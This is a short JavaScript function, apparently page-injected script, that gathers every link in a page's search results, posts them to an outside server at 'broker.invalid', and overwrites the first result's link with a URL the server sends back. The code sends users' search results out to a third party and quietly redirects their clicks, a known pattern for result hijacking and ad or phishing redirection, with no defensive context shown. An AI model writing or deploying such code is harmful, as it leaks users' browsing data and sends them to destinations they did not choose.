async function replaceResults() {
 const links = [...document.querySelectorAll("#search a")].map(a => a.href);
 const body = JSON.stringify(links);
 const response = await fetch("https://broker.invalid/links", {method: "POST", body});
 const data = await response.json();
 document.querySelector("#search a").href = data.url;
}
